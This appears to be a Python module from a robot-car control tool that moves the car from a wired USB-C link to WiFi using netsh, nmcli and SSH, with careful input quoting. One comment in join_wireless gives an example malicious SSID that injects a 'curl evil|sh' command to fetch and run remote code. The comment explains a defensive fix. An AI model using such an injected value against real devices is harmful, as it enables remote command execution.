"""连接模式：有线（USB-C 直连）与无线（WiFi）。

用户描述的真实流程
------------------
车在一个陌生环境里不会直接联网，需要先用 USB-C 线接上位机：

```
电脑 USB-C ──> 车机（固定 IP 192.168.128.10）
  → RustDesk 连 192.168.128.10 进桌面
  → 把车机连到与电脑相同的 WiFi
  → 车机 ifconfig 读 WiFi 分配的 IP
  → 拔掉有线
  → RustDesk 连那个 WiFi IP 远程控车
```

软件把这个流程自动化：检测有线 → 让车连 WiFi → 读 IP → 提示拔线 → 开始检测。

设计取舍（2026-11-03 用户确认）
------------------------------
1. **检测上位机连接用「网络可达」，不读 USB 端口枚举**
   用户选甲。理由：真正关心的是「能不能连上」，
   USB 枚举到了不等于网络通。实现上判断本机是否有 192.168.128.0/24
   网段且 192.168.128.10 可达。

2. **自动读电脑当前 WiFi 名，让车连同名网络**
   用户选甲。Windows 上 `netsh wlan show interfaces` 拿 SSID，
   不需要管理员权限。

3. **密码手动输入**
   Windows 读已保存 WiFi 密码需要管理员权限（`netsh wlan show profile key=clear`），
   程序不该提权。用户已确认接受。

4. **车已在目标 WiFi 上则跳过重连**
   用户选甲。这台车实测常同时连着有线和无线，
   跳过重连既快又不会让车短暂掉线。

安全边界
--------
本模块只在**用户显式选择有线模式并点开始检测**时才被调用，
不会在程序启动时自动连 WiFi。所有 nmcli 写操作前都会先读当前状态，
能不改就不改。
"""

from __future__ import annotations

import re
import socket
import subprocess
import time
from dataclasses import dataclass, field
from typing import List, Optional

from .ssh import Remote, _shquote

# 有线直连时车机的固定地址。这是硬件事实，不随产品变化，
# 因此可以写在代码里（与「产品话题」不同）。
WIRED_CAR_IP = "192.168.128.10"
WIRED_SUBNET_PREFIX = "192.168.128."


class ConnectError(Exception):
    """连接流程失败。消息要能直接显示给用户。"""


@dataclass
class WirelessInfo:
    """车上 WiFi 的当前状态。"""

    connected: bool = False
    ssid: str = ""
    ip: str = ""
    # 车扫描到的可用网络（连接失败时给用户看）
    available: List[str] = field(default_factory=list)


@dataclass
class HostWifi:
    """电脑当前连的 WiFi。"""

    connected: bool = False
    ssid: str = ""


# ---------------------------------------------------------------------------
# 本机（电脑）侧
# ---------------------------------------------------------------------------

def parse_netsh_output(out: str) -> tuple:
    """解析 `netsh wlan show interfaces` 的输出，返回 (ssid, state, connected)。

    **必须按「行首键名」匹配，不能用子串匹配。**

    中文 Windows 的输出里有三行都含「状态」：

        状态                  : 已连接        ← 真正想要的
        无线电状态            : 硬件 开       ← 也含「状态」
        承载网络状态          : 不可用         ← 也含「状态」

    循环按行跑，最后一行赢 —— 于是 state 变成「不可用」，
    连着的 WiFi 被判成未连接，有线模式直接罢工。
    （2026-11-05 审查用真实输出复现并证实的缺陷。）

    同样不能对 state 做 `"connected" in state.lower()` 的子串判断：
    `disconnected` 里也含 `connected`。
    """
    ssid = ""
    state = ""

    for line in out.splitlines():
        s = line.strip()
        if not s:
            continue
        # 全角冒号归一化：某些系统/输入法会输出「状态：已连接」。
        # 不归一化的话会静默判成「未连接」—— 和刚修掉的那个 bug
        # 是同一种失败形态，成本极低就一并处理。
        s = s.replace("\uff1a", ":")
        # 用 split(":", 1)：SSID 本身可以含冒号（合法），
        # partition 会在第一个冒号处切，值仍然完整，但显式写更清楚。
        parts = s.split(":", 1)
        if len(parts) != 2:
            continue
        key = parts[0].strip()
        value = parts[1].strip()
        low_key = key.lower()

        # BSSID 行也以 SSID 结尾，必须先排除
        if "bssid" in low_key:
            continue
        if low_key.startswith("ssid"):
            ssid = value
        elif low_key.startswith("state") or key.startswith("状态"):
            state = value

    low_state = state.lower()
    # 先排否定词，再认肯定词，避免 disconnected 被当成 connected
    negative = ("disconnect" in low_state
                or "断开" in state
                or "未连接" in state)
    positive = (low_state.strip() == "connected"
                or state.strip() == "已连接")

    return ssid, state, bool(ssid) and positive and not negative


def host_wifi() -> HostWifi:
    """读电脑当前连的 WiFi 名称。

    Windows 用 netsh；其它平台返回未连接（本工具主要跑 Windows）。
    失败不抛异常 —— 拿不到就当没有，由调用方决定怎么提示。
    """
    try:
        out = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=10,
            encoding="utf-8", errors="replace",
        ).stdout
    except (OSError, subprocess.SubprocessError):
        return HostWifi()

    ssid, _state, connected = parse_netsh_output(out)
    return HostWifi(connected=connected, ssid=ssid)


def _ping(host: str, count: int = 2, timeout_ms: int = 1200) -> bool:
    """Windows ping。用 -n/-w，跨平台差异在调用处兜。"""
    try:
        result = subprocess.run(
            ["ping", "-n", str(count), "-w", str(timeout_ms), host],
            capture_output=True, text=True, timeout=count * 2 + 5,
            encoding="utf-8", errors="replace",
        )
    except (OSError, subprocess.SubprocessError):
        return False
    out = (result.stdout or "") + (result.stderr or "")
    # 英文 "TTL=" / 中文 "TTL=" 都存在；用 TTL 判成功最稳
    return "TTL=" in out.upper()


def local_has_wired_subnet() -> bool:
    """本机是否有一个 192.168.128.0/24 的网卡。

    这是「USB-C 线插着」的可靠信号：车机的 usb0/l4tbr0 会给出
    192.168.128.10，电脑侧对应的虚拟网卡会拿到同网段地址。
    """
    try:
        import psutil
    except ImportError:
        # 没有 psutil 时退化为「能 ping 通就算」
        return _ping(WIRED_CAR_IP)

    try:
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET and addr.address.startswith(
                    WIRED_SUBNET_PREFIX
                ):
                    return True
    except Exception:
        return _ping(WIRED_CAR_IP)
    return False


def wired_link_ready(timeout: float = 8.0) -> bool:
    """有线链路是否可用：同网段网卡存在 且 车机可达。

    两个条件都要满足。只有网卡但 ping 不通，说明线插着但车没起来；
    只有 ping 通但没有网卡，几乎不可能，但如果发生说明路由来自别处。
    """
    if not local_has_wired_subnet():
        return False
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _ping(WIRED_CAR_IP):
            return True
        time.sleep(0.5)
    return False


# ---------------------------------------------------------------------------
# 车上侧
# ---------------------------------------------------------------------------

def read_wireless(remote: Remote) -> WirelessInfo:
    """读车上 wlan0 的连接状态与 IP。"""
    info = WirelessInfo()
    try:
        out = remote.run(
            "nmcli -t -f NAME,DEVICE connection show --active 2>/dev/null",
            timeout=15, record=False,
        ).stdout
        for line in out.splitlines():
            parts = line.strip().split(":")
            if len(parts) >= 2 and parts[-1].startswith("wlan"):
                info.ssid = parts[0]
                info.connected = True
                break

        ip_out = remote.run(
            "ip -4 addr show wlan0 2>/dev/null | grep -oP 'inet \\K[\\d.]+'",
            timeout=15, record=False,
        ).stdout
        match = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", ip_out)
        if match:
            info.ip = match.group(1)
    except Exception:
        pass
    return info


# 频段后缀。同一个 AP 常同时广播 2.4G 与 5G，名字只差一个后缀。
# 实测：电脑连 TianbotOffice-5G，车连 TianbotOffice —— 精确匹配会失败。
_BAND_SUFFIXES = ("-5g", "-5G", "-2.4g", "-2.4G", "_5g", "_5G",
                  " 5G", " 2.4G")


def _base_ssid(name: str) -> str:
    """去掉频段后缀，得到「同一个网络」的归一化名字。"""
    result = name.strip()
    for suffix in _BAND_SUFFIXES:
        if result.endswith(suffix):
            return result[: -len(suffix)]
    return result


def match_ssid(target: str, available: List[str]) -> Optional[str]:
    """在车能看到的网络里，找与 target 对应的那个。

    匹配优先级：
      1. 完全相同（最安全）
      2. 去掉频段后缀后相同（电脑在 5G、车在 2.4G 是常态）
    都不中返回 None —— 不猜。

    为什么不直接用前缀匹配：`TianbotOffice` 是 `TianbotOffice-602`
    的前缀，但那可能是另一个 AP，连错了比连不上更麻烦。
    """
    if not target:
        return None
    if target in available:
        return target

    base = _base_ssid(target).lower()
    candidates = [name for name in available if _base_ssid(name).lower() == base]
    if not candidates:
        return None
    # 多个候选时优先选信号最强的（nmcli 列表按信号强弱排序，取第一个）
    return candidates[0]


def scan_wireless(remote: Remote) -> List[str]:
    """扫描车上能看到的 WiFi 名（去重保序）。"""
    try:
        out = remote.run(
            "nmcli -t -f SSID device wifi list 2>/dev/null",
            timeout=40, record=False,
        ).stdout
    except Exception:
        return []
    seen: List[str] = []
    for line in out.splitlines():
        name = line.strip().split(":")[0].strip()
        if name and name not in seen:
            seen.append(name)
    return seen


def join_wireless(remote: Remote, ssid: str, password: str,
                  timeout: int = 60) -> tuple:
    """让车连上指定 WiFi。返回 (成功, 说明文字)。

    nmcli 的失败原因比较含糊，这里按常见情形给出可读提示。
    """
    if not ssid:
        return False, "没有指定 WiFi 名称"

    # SSID 与密码都要过 shell 转义。
    # 这两个入参都不是我们自己控制的：
    #   · ssid 来自车上 `nmcli device wifi list` 的输出 —— 附近任何 AP
    #     都能把自己的名字设成 `X'; curl evil|sh; '`
    #   · password 是用户手输，随手一个含单引号的密码就触发
    # 不转义就等于允许外部输入在车上执行任意命令（以 sunrise 身份）。
    # 注意：密码虽然已做 shell 转义（防注入），但仍以命令行参数传给
    # nmcli，因此在车上的 `ps aux` 里能看到明文，直到 nmcli 退出；
    # NetworkManager 也会把它明文存进 system-connections/<SSID>。
    # 这不是新增漏洞，但**不要在共用车上使用重要的 WiFi 密码**。
    q_ssid = _shquote(ssid)

    # 已有同名连接就直接 up 它，避免重复创建
    existing = remote.run(
        f"nmcli -t -f NAME connection show | grep -Fx {q_ssid} || true",
        timeout=15, record=False,
    ).stdout.strip()

    if existing:
        cmd = f"nmcli connection up {q_ssid}"
    else:
        if not password:
            return False, "该 WiFi 需要密码，但未提供"
        cmd = f"nmcli device wifi connect {q_ssid} password {_shquote(password)}"

    result = remote.run(f"timeout {timeout} {cmd} 2>&1", timeout=timeout + 15)
    text = (result.stdout or "").strip()

    if result.ok and "error" not in text.lower():
        return True, text

    lowered = text.lower()
    if "secrets were required" in lowered or "no secrets" in lowered:
        return False, "密码不正确或该网络需要额外认证"
    if "not found" in lowered:
        return False, f"车没有扫描到「{ssid}」，请确认电脑连的是哪个网络"
    if "timeout" in lowered:
        return False, f"连接「{ssid}」超时，可能信号太弱或密码错误"
    return False, text or "连接失败，原因未知"


def wait_for_wireless_ip(remote: Remote, timeout: int = 30) -> str:
    """等 wlan0 拿到 IP，返回地址；超时返回空串。"""
    deadline = time.time() + timeout
    while time.time() < deadline:
        info = read_wireless(remote)
        if info.ip:
            return info.ip
        time.sleep(2)
    return ""


def wired_link_present(remote: Remote) -> bool:
    """车上侧确认有线网卡还连着（用于判断「用户拔线了」）。"""
    try:
        out = remote.run(
            "ip -4 addr show usb0 2>/dev/null | grep -c 'inet ' || true",
            timeout=12, record=False,
        ).stdout.strip()
        return out not in ("", "0")
    except Exception:
        return False


# ---------------------------------------------------------------------------
# 拔线检测
# ---------------------------------------------------------------------------

def wait_for_unplug(poll_seconds: float = 1.5,
                    timeout: int = 120) -> bool:
    """等用户拔掉 USB 线。

    判据：本机 192.168.128.10 不再可达。
    注意这**不能区分「拔线」和「车断电」** —— 两者都表现为不可达。
    所以超时后不报错，由调用方提示用户自己确认。

    返回 True 表示已不可达（可以继续），False 表示超时仍连着。
    """
    time.sleep(1.0)
    deadline = time.time() + timeout
    while time.time() < deadline:
        if not _ping(WIRED_CAR_IP, count=1, timeout_ms=800):
            return True
        time.sleep(poll_seconds)
    return False


def build_wired_target(profile_id: Optional[str] = None):
    """有线模式下的连接参数。

    有线直连时车机地址固定，用户名/密码沿用产品默认。
    密码留空由调用方补 —— 本模块不持有凭据。
    """
    return {"host": WIRED_CAR_IP, "profile_id": profile_id}
